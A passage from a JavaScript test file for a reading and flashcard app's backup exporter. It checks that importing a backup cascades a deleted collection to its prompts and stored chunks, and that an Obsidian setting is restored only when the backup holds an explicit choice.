  M.bus = { on() { return () => {}; }, off() {}, emit(type, payload) { events.push(type + ":" + ((payload && (payload.collectionId || payload.promptId)) || "")); } };
  M.app = { toast() { return { close() {} }; } };
  const store = require(path.join(JS, "store.js"));
  const cache = require(path.join(JS, "cache.js"));
  M.store = store; M.cache = cache;
  try {
    const T = T0;
    await store.open();
    const X = { id: "book_X", kind: "book", name: "griffiths", fileName: "g.pdf", sha256: "sha_x", hashAlgo: "sha-256", pageCount: 3, pageLabels: null,
      sections: [], lastPosition: null, addedAt: T - DAY, lastOpenedAt: T, updatedAt: T + 50, deletedAt: null, v: 1 };
    await store.docs.saveDocument(X, new Uint8Array(3 * 1024 * 1024));
    const Y = { id: "deck_Y", kind: "deck", name: "Y", description: "", sections: [], addedAt: T - DAY, lastOpenedAt: T, updatedAt: T + 50, deletedAt: T + 50, v: 1 };
    await store.collections.put(Y);
    const mk = (id, collectionId, cu, extra) => withDue(Object.assign({ id, collectionId, kind: "qa", text: "Q. " + id + "?\nA. yes", tags: [], flagged: false,
      anchor: null, context: null, cards: [cardAt(0, T)], createdAt: T, contentUpdatedAt: cu, updatedAt: cu, deletedAt: null, v: 1 }, extra || {}));
    await store.prompts.put(mk("p_P", "book_X", T + 200));
    await store.prompts.put(mk("p_R", "book_X", T));
    await cache.load();
    assert.ok(await store.docs.loadBytes("book_X"), "the book has bytes before the import");
    const backup = {
      format: "marginalia", version: 1, schedulerVersion: 1, exportedAt: T + 300, scope: "all", settings: {},
      collections: [Object.assign({}, X, { deletedAt: T + 100, updatedAt: T + 100, hasBytes: false }), Object.assign({}, Y, { deletedAt: null, updatedAt: T + 10 })],
      prompts: [mk("p_P", "book_X", T, { deletedAt: T + 100, updatedAt: T + 100 }), mk("p_Q", "book_X", T + 90), mk("p_W", "deck_Y", T + 60)],
      attachments: []
    };
    const report = await exporter.importJSON(JSON.stringify(backup));
    assert.deepEqual([report.added, report.updated, report.cascaded, report.collections.removed, report.failed], [2, 1, 1, 1, 0]);
    for (const rec of [cache.collection("book_X"), await store.collections.get("book_X")]) {
      assert.deepEqual([rec.deletedAt, rec.hasBytes, rec.chunkCount], [T + 100, false, 0]);
    }
    assert.equal(await store.docs.loadBytes("book_X"), null, "the chunks are deleted");
    const expected = { p_P: T + 100, p_R: T + 100, p_Q: T + 100, p_W: T + 50 };
    for (const id of Object.keys(expected)) {
      assert.equal(cache.prompt(id).deletedAt, expected[id], id);
      assert.equal((await store.prompts.get(id)).deletedAt, expected[id], id + " (store)");
      assert.equal("dueAt" in cache.prompt(id), false, id);
    }
    const limbo = cache.prompts().filter((p) => !p.deletedAt && cache.collection(p.collectionId) && cache.collection(p.collectionId).deletedAt);
    assert.deepEqual(limbo, []);
    assert.equal(cache.counts(null, T + 400 * DAY).due, 0);
    if (typeof S.buildQueue === "function") assert.deepEqual(S.buildQueue({ prompts: cache.prompts(), scope: "all", now: T + 400 * DAY, seed: 1 }), []);
    assert.ok(events.includes("collection:deleted:book_X"), events.join(" "));
  } finally {
    M.cache = prev.cache; M.store = prev.store; M.bus = prev.bus; M.app = prev.app;
  }
});

/* SELF-CHECK (SPEC §12 exporter.test.js): backup round-trip deep-equal; merge rules (content by contentUpdatedAt,
 * log union + replay via M.scheduler, prompt tombstones, collection tombstones, sha256 matching, created collections,
 * skipped orphans, attachments kept); TSV directives, columns, escaping and CSV quoting; cloze numbering; Markdown
 * layout; importJSON validation/writes/settings; prepare() filenames and mimes; deliver() fallback.
 * Import hardening: raster-only attachments by signature (no SVG/HTML, canonical mime) in merge, store and every export;
 * 4 MB / dimension / record-count / image-byte limits; a deleted collection cascades to its prompts and chunks (pure
 * merge and real cache + store); merged cards capped at the winning text; collection content vs. view-state merge. */

// ---- DECISIONS D32: the Obsidian switch (settings.obsidian) in a backup's settings ----------------------------------------
test("the Obsidian switch travels in the backup settings; an import restores it only when the backup holds a choice", async () => {
  assert.ok(exporter.SETTINGS_KEYS.indexOf("obsidian") >= 0, "one of the backup settings");
  const f = fixture();
  const saved = { collections: [], prompts: [], attachments: new Map(), settings: {}, set: [] };
  const prev = { cache: M.cache, store: M.store, settings: M.settings, app: M.app };
  M.cache = {
    collections: () => saved.collections,
    prompts: () => saved.prompts,
    async saveCollection(c) { const i = saved.collections.findIndex((x) => x.id === c.id); if (i < 0) saved.collections.push(c); else saved.collections[i] = c; return c; },
    async savePrompt(p) { const i = saved.prompts.findIndex((x) => x.id === p.id); if (i < 0) saved.prompts.push(p); else saved.prompts[i] = p; return p; }
  };
  M.store = { attachments: {
    async allIds() { return [...saved.attachments.keys()]; },
    async put(a) { saved.attachments.set(a.id, a); },
    async get(id) { return saved.attachments.get(id) || null; }
  } };
  M.settings = { set(k, v) { saved.set.push(k); saved.settings[k] = v; }, get(k) { return saved.settings[k]; }, all() { return saved.settings; } };
  M.app = { toast() { return { close() {} }; } };
  const backup = (settings) => exporter.toJSON({ attachments: f.attachments, collections: f.collections, prompts: f.prompts, settings });
  try {
    // what a backup carries: the choice as it is, null (never chosen) included
    saved.settings = { obsidian: true, obsidianFolder: "Reading" };
    assert.equal(JSON.parse((await exporter.prepare("json", { scope: "all", includeImages: false })).text).settings.obsidian, true);
    saved.settings = { obsidian: null };
    assert.equal(JSON.parse((await exporter.prepare("json", { scope: "all", includeImages: false })).text).settings.obsidian, null);
    // an import with "Also restore settings": true and false are choices, and are restored
    for (const choice of [true, false]) {
      saved.settings = { obsidian: !choice }; saved.set = [];
      await exporter.importJSON(backup({ obsidian: choice, obsidianFolder: "Reading" }), { restoreSettings: true });
      assert.equal(saved.settings.obsidian, choice, "the backup's choice " + choice);
      assert.equal(saved.settings.obsidianFolder, "Reading");
    }
    // never chosen in the backup (null), or a backup from before the switch (no key): this library's choice stays
    for (const settings of [{ obsidian: null, obsidianFolder: "Notes" }, { obsidianFolder: "Notes" }, { obsidian: "yes", obsidianFolder: "Notes" }]) {
      for (const mine of [true, false]) {
        saved.settings = { obsidian: mine }; saved.set = [];
        await exporter.importJSON(backup(settings), { restoreSettings: true });
        assert.equal(saved.settings.obsidian, mine, JSON.stringify(settings) + " leaves " + mine);
        assert.ok(saved.set.indexOf("obsidian") < 0, "the switch is not set at all");
        assert.equal(saved.settings.obsidianFolder, "Notes", "the other settings are restored");
      }
    }
    // without "Also restore settings" nothing is set
    saved.settings = { obsidian: false }; saved.set = [];
    await exporter.importJSON(backup({ obsidian: true }), { restoreSettings: false });
    assert.deepEqual([saved.settings.obsidian, saved.set.length], [false, 0]);
  } finally {
    M.cache = prev.cache; M.store = prev.store; M.settings = prev.settings; M.app = prev.app;
  }
});
